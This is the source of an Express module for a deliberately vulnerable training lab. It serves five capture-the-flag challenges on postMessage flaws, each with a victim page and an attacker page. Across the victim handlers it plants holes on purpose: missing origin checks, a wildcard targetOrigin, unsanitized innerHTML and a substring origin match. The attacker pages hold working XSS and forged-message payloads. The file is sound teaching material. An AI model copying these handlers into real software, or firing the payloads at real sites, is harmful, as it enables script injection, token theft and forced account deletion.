// PenTrix VulnLab module: postMessage Flaws (postmsg)
// Five labs on the postMessage API. Each lab has a victim page and an in-lab
// attacker page. When the flaw triggers, the victim page's JavaScript calls
// fetch('/postmsg/beacon?v=<vuln-id>&d='+encodeURIComponent(data)) and the
// beacon awards the flag. Same-origin in this lab; the code flaw being taught
// (missing origin check, wildcard target, unsanitized data, substring match,
// privileged message actions) is real in each victim page. Local lab use only.
const express = require('express');
const crypto = require('crypto');
const { getDb } = require('../../lib/db');
const { page, esc, flagBox, hintBox, brief } = require('../../lib/page');
const { award, captured } = require('../../lib/flags');

const router = express.Router();
router.use(express.urlencoded({ extended: false }));

const VULN_IDS = ['no-check', 'wildcard', 'data-xss', 'substring', 'csrf-action'];

// ---------------------------------------------------------------------------
// Flag capture beacon. Awards only when the victim page's own JavaScript fired
// with lab-specific data: every victim handler prefixes its beacon payload,
// and two labs additionally require real lab state (the exfiltrated secret,
// the deleted account).
// ---------------------------------------------------------------------------
router.get('/beacon', (req, res) => {
  const v = String(req.query.v || '');
  const d = String(req.query.d || '');
  let ok = false;
  if (VULN_IDS.includes(v) && d) {
    if (v === 'wildcard') {
      ok = !!req.session.pm_secret && d.includes(req.session.pm_secret);
    } else if (v === 'csrf-action') {
      ok = d.startsWith('csrf-action:') && req.session.pm_deleted === true;
    } else {
      ok = d.startsWith(v + ':');
    }
  }
  if (ok) {
    const flag = award(req, 'postmsg', v);
    return res.send(page('Exploit confirmed', `
      <h2>Exploit confirmed</h2>
      <p>The victim page's message handler fired with attacker-controlled data
      for vuln <b>${esc(v)}</b>.</p>
      ${flagBox(flag)}
      <p><a href="/postmsg">Back to the postMessage module</a></p>
    `));
  }
  res.status(400).send(page('Beacon', `
    <h2>No flag</h2>
    <p>This endpoint only awards a flag when the victim page's JavaScript fires it
    with the expected payload (<code>v</code> = no-check, wildcard, data-xss,
    substring, or csrf-action, plus lab-specific data). Open a lab's attacker page
    in your browser and fire the payload from there.</p>
    <p><a href="/postmsg">Back to the postMessage module</a></p>
  `));
});

// ---------------------------------------------------------------------------
// Lab 1: no origin check, message written into innerHTML
// ---------------------------------------------------------------------------
router.get('/no-check', (req, res) => {
  res.send(page('Chat widget (no origin check)', `
    <h2>Chat widget</h2>
    <p>Messages posted to this page appear below.</p>
    <div id="inbox" style="border:1px dashed #888; padding:1em; min-height:3em;"></div>
    <script>
      window.addEventListener('message', function (e) {
        // VULN: no origin check at all - any website can drive this handler,
        // and the message is rendered as HTML.
        document.getElementById('inbox').innerHTML = '<p>Message: ' + e.data + '</p>';
        fetch('/postmsg/beacon?v=no-check&d=' + encodeURIComponent('no-check:' + String(e.data).slice(0, 200)));
      });
    </script>
    <p class="note">Attacker page: <a href="/postmsg/no-check/attacker">open it</a> and fire the payload.</p>
  `));
});

router.get('/no-check/attacker', (req, res) => {
  res.send(page('Attacker: no origin check', `
    <h2>Attacker page (lab 1)</h2>
    <p>This page embeds the victim widget in an iframe, then posts a message to it
    from a <i>different</i> page. The victim never checks <code>event.origin</code>.</p>
    <iframe id="v" src="/postmsg/no-check" width="100%" height="220"></iframe><br /><br />
    <button id="fire">Fire payload</button>
    <p id="log"></p>
    <script>
      document.getElementById('fire').onclick = function () {
        var payload = '<img src=x onerror="document.getElementById(\\'log\\').textContent=\\'XSS via postMessage\\'">';
        document.getElementById('v').contentWindow.postMessage(payload, '*');
        document.getElementById('log').textContent = 'Payload posted. Check the widget above and your flag.';
      };
    </script>
  `));
});

// ---------------------------------------------------------------------------
// Lab 2: victim posts its secret to the parent with a wildcard target origin
// ---------------------------------------------------------------------------
router.get('/wildcard', (req, res) => {
  if (!req.session.pm_secret) req.session.pm_secret = crypto.randomBytes(16).toString('hex');
  const secret = req.session.pm_secret;
  res.send(page('Widget (wildcard postMessage)', `
    <h2>Trusted widget</h2>
    <p>This widget shares a secret token with the page that embeds it.</p>
    <div id="out"></div>
    <script>
      var SECRET_TOKEN = ${JSON.stringify(secret)};
      window.addEventListener('load', function () {
        // VULN: sensitive data posted with targetOrigin '*', so ANY embedding
        // page - including an attacker's - receives the secret.
        parent.postMessage({ token: SECRET_TOKEN, from: 'trusted-widget' }, '*');
        document.getElementById('out').textContent = 'Token shared with parent frame.';
      });
    </script>
    <p class="note">Attacker page: <a href="/postmsg/wildcard/attacker">open it</a>; it embeds this
    widget and listens for the token.</p>
  `));
});

router.get('/wildcard/attacker', (req, res) => {
  res.send(page('Attacker: wildcard targetOrigin', `
    <h2>Attacker page (lab 2)</h2>
    <p>An evil page embedding the victim widget. Because the widget uses
    <code>postMessage(data, '*')</code>, the token lands here.</p>
    <iframe id="v" src="/postmsg/wildcard" width="100%" height="220"></iframe>
    <p>Captured token: <code id="got">(waiting...)</code></p>
    <script>
      window.addEventListener('message', function (e) {
        if (e.data && e.data.token) {
          document.getElementById('got').textContent = e.data.token;
          fetch('/postmsg/beacon?v=wildcard&d=' + encodeURIComponent('wildcard:' + e.data.token));
        }
      });
    </script>
  `));
});

// ---------------------------------------------------------------------------
// Lab 3: message data flows into innerHTML without sanitization
// ---------------------------------------------------------------------------
router.get('/data-xss', (req, res) => {
  res.send(page('Preview pane (unsanitized data)', `
    <h2>Link preview</h2>
    <p>Other pages can send this pane a preview to render.</p>
    <div id="preview" style="border:1px dashed #888; padding:1em; min-height:3em;"></div>
    <script>
      window.addEventListener('message', function (e) {
        var html = (e.data && e.data.html) ? e.data.html : String(e.data);
        // VULN: event.data is rendered as HTML with no sanitization.
        document.getElementById('preview').innerHTML = html;
        fetch('/postmsg/beacon?v=data-xss&d=' + encodeURIComponent('data-xss:' + String(html).slice(0, 200)));
      });
    </script>
    <p class="note">Attacker page: <a href="/postmsg/data-xss/attacker">open it</a> and fire the payload.</p>
  `));
});

router.get('/data-xss/attacker', (req, res) => {
  res.send(page('Attacker: unsanitized data', `
    <h2>Attacker page (lab 3)</h2>
    <p>This page sends the victim preview pane an object whose <code>html</code>
    property becomes live markup.</p>
    <iframe id="v" src="/postmsg/data-xss" width="100%" height="220"></iframe><br /><br />
    <button id="fire">Fire payload</button>
    <p id="log"></p>
    <script>
      document.getElementById('fire').onclick = function () {
        document.getElementById('v').contentWindow.postMessage(
          { html: '<img src=x onerror="alert(\\'postMessage XSS\\')">' }, '*');
        document.getElementById('log').textContent = 'Payload posted. Check the preview pane above and your flag.';
      };
    </script>
  `));
});

// ---------------------------------------------------------------------------
// Lab 4: naive substring check on the origin
// ---------------------------------------------------------------------------
router.get('/substring', (req, res) => {
  const sim = req.query.simulateOrigin || '';
  res.send(page('Widget (substring origin check)', `
    <h2>Partner widget</h2>
    ${sim ? `<p class="note"><b>LAB SIMULATION:</b> this page is testing the origin
      <code>${esc(sim)}</code> instead of the real <code>event.origin</code>. A local lab cannot
      mint new DNS origins, so the attacker origin is simulated; the vulnerable
      <code>includes()</code> check itself is the real code under test.</p>` : ''}
    <div id="out" style="border:1px dashed #888; padding:1em; min-height:3em;">(no message yet)</div>
    <script>
      var SIMULATED_ORIGIN = ${JSON.stringify(sim)};
      window.addEventListener('message', function (e) {
        var originToTest = SIMULATED_ORIGIN || e.origin;
        // VULN: substring match instead of an exact/suffix comparison.
        // 'https://pentrix.lab.evil.com'.includes('pentrix.lab') is true,
        // so an attacker domain containing the trusted string passes.
        if (originToTest.includes('pentrix.lab')) {
          document.getElementById('out').innerHTML = String(e.data);
          fetch('/postmsg/beacon?v=substring&d=' + encodeURIComponent('substring:' + String(e.data).slice(0, 200)));
        } else {
          document.getElementById('out').textContent = 'Blocked origin: ' + e.origin;
        }
      });
    </script>
    <p class="note">Attacker page: <a href="/postmsg/substring/attacker">open it</a>.</p>
  `));
});

router.get('/substring/attacker', (req, res) => {
  const evil = 'https://pentrix.lab.evil.com';
  res.send(page('Attacker: substring bypass', `
    <h2>Attacker page (lab 4)</h2>
    <p>The victim trusts any origin <i>containing</i> <code>pentrix.lab</code>.
    In production the attacker hosts this page at <code>${esc(evil)}</code>:</p>
    <pre><code>'${esc(evil)}'.includes('pentrix.lab')  // true - check passes
'https://pentrix.lab'.includes('pentrix.lab')      // true - legitimate partner
'https://evil.com'.includes('pentrix.lab')         // false - blocked</code></pre>
    <p>The iframe below loads the victim with the attacker origin simulated
    (see the banner on the victim page), then this page posts the payload:</p>
    <iframe id="v" src="/postmsg/substring?simulateOrigin=${encodeURIComponent(evil)}" width="100%" height="260"></iframe><br /><br />
    <button id="fire">Fire payload</button>
    <p id="log"></p>
    <script>
      document.getElementById('fire').onclick = function () {
        document.getElementById('v').contentWindow.postMessage('<b>pwned via substring check</b>', '*');
        document.getElementById('log').textContent = 'Payload posted. Check the widget above and your flag.';
      };
    </script>
  `));
});

// ---------------------------------------------------------------------------
// Lab 5: a privileged action triggered by any message, no origin check
// ---------------------------------------------------------------------------
router.get('/csrf-action', (req, res) => {
  const deleted = req.session.pm_deleted === true;
  res.send(page('Account settings (message-driven)', `
    <h2>Account settings</h2>
    <p>Account status: <b>${deleted ? 'DELETED' : 'active'}</b></p>
    <form method="POST" action="/postmsg/csrf-action/delete">
      <button type="submit">Delete my account (legitimate button)</button>
    </form>
    <p id="status"></p>
    <script>
      window.addEventListener('message', function (e) {
        var action = e.data && e.data.action;
        // VULN: a state-changing action is triggered by any cross-origin
        // message with no origin check and no user confirmation.
        if (action === 'delete-account') {
          fetch('/postmsg/csrf-action/delete', { method: 'POST' })
            .then(function (r) { return r.json(); })
            .then(function (j) {
              document.getElementById('status').textContent = j.status;
              fetch('/postmsg/beacon?v=csrf-action&d=' + encodeURIComponent('csrf-action:account-deleted'));
            });
        }
      });
    </script>
    <p class="note">Attacker page: <a href="/postmsg/csrf-action/attacker">open it</a> and fire the payload.
    <a href="/postmsg/csrf-action/reset">Reset the lab account</a>.</p>
  `));
});

router.post('/csrf-action/delete', (req, res) => {
  req.session.pm_deleted = true;
  res.json({ status: 'account deleted (lab only)' });
});

router.get('/csrf-action/reset', (req, res) => {
  req.session.pm_deleted = false;
  res.redirect('/postmsg/csrf-action');
});

router.get('/csrf-action/attacker', (req, res) => {
  res.send(page('Attacker: forged action', `
    <h2>Attacker page (lab 5)</h2>
    <p>This page embeds the victim's account settings and sends it a message the
    victim treats as a command. No origin is checked.</p>
    <iframe id="v" src="/postmsg/csrf-action" width="100%" height="260"></iframe><br /><br />
    <button id="fire">Fire payload</button>
    <p id="log"></p>
    <script>
      document.getElementById('fire').onclick = function () {
        document.getElementById('v').contentWindow.postMessage({ action: 'delete-account' }, '*');
        document.getElementById('log').textContent = 'Message sent. Reload the victim page to see the deleted account, and check your flag.';
      };
    </script>
  `));
});

// ---------------------------------------------------------------------------
// Module index
// ---------------------------------------------------------------------------
const PATHS = {
  'no-check': 'no-check',
  'wildcard': 'wildcard',
  'data-xss': 'data-xss',
  'substring': 'substring',
  'csrf-action': 'csrf-action',
};

router.get('/', (req, res) => {
  const rows = module.exports.vulns.map((v) => {
    const done = captured(req, 'postmsg', v.id);
    return `
      <div class="vuln-card">
        <h3><a href="/postmsg/${PATHS[v.id]}">${esc(v.name)}</a>
          <span class="diff">${esc(v.difficulty)}</span>
          ${done ? '<span class="captured">flag captured</span>' : ''}
        </h3>
        ${hintBox(v.hint)}
        <p><i>Attack:</i> ${esc(v.how)}</p>
        <p><a href="/postmsg/${PATHS[v.id]}/attacker">Attacker page</a></p>
      </div>`;
  }).join('\n');

  res.send(page('postMessage Flaws', `
    ${brief('Module briefing', `
      <p><b>postMessage in 30 seconds:</b> web pages can send each other messages with
      <code>window.postMessage(data, targetOrigin)</code>, and receive them with a
      <code>message</code> event listener. The receiver is supposed to verify
      <code>event.origin</code> before acting on the data, and the sender is supposed to
      name a specific <code>targetOrigin</code> instead of <code>'*'</code>.</p>
      <p><b>The pattern in this module:</b> each lab has a <b>victim page</b> with a broken
      message handler and an <b>attacker page</b> that drives it. When the flaw triggers, the
      victim page itself calls <code>/postmsg/beacon?v=&lt;lab&gt;&amp;d=...</code>, which awards
      the flag. Open each attacker page in your browser and fire the payload from there.</p>`)}
    <h2>Challenges</h2>
    ${rows}
  `));
});

module.exports = {
  id: 'postmsg',
  name: 'postMessage Flaws',
  tagline: 'Missing origin checks turn postMessage into a remote control.',
  description: 'Five labs on the postMessage API: a handler with no origin check, a secret leaked via wildcard targetOrigin, unsanitized message data rendered as HTML, a naive substring origin check, and a privileged action driven by forged messages. Each lab pairs a victim page with an in-lab attacker page.',
  difficulty: 'Mixed',
  vulns: [
    {
      id: 'no-check',
      name: 'No Origin Check on Message Handler',
      difficulty: 'Medium',
      hint: 'The widget renders every message it receives as HTML and never looks at event.origin. Any page can talk to it.',
      how: 'Open the attacker page and post an HTML payload into the victim iframe.',
    },
    {
      id: 'wildcard',
      name: 'Secret Leaked via Wildcard targetOrigin',
      difficulty: 'Easy',
      hint: 'The widget posts its secret token to parent with targetOrigin "*". Embed it in the attacker page and just listen.',
      how: 'Open the attacker page; it captures the token the widget broadcasts and beacons it.',
    },
    {
      id: 'data-xss',
      name: 'Unsanitized Message Data Rendered as HTML',
      difficulty: 'Medium',
      hint: 'The preview pane drops event.data.html straight into innerHTML. The message can be an object, not just a string.',
      how: 'Post {html: "<img src=x onerror=...>"} from the attacker page.',
    },
    {
      id: 'substring',
      name: 'Substring Origin Check Bypass',
      difficulty: 'Medium',
      hint: 'The check is origin.includes("pentrix.lab"), not an exact match. Which attacker domain contains that string?',
      how: 'Serve the attack from https://pentrix.lab.evil.com (simulated in the lab) and post the payload.',
    },
    {
      id: 'csrf-action',
      name: 'Privileged Action via Forged Message',
      difficulty: 'Medium',
      hint: 'Any message shaped like {action:"delete-account"} triggers the account deletion, with no origin check.',
      how: 'Post that message from the attacker page into the victim iframe.',
    },
  ],
  router,
};
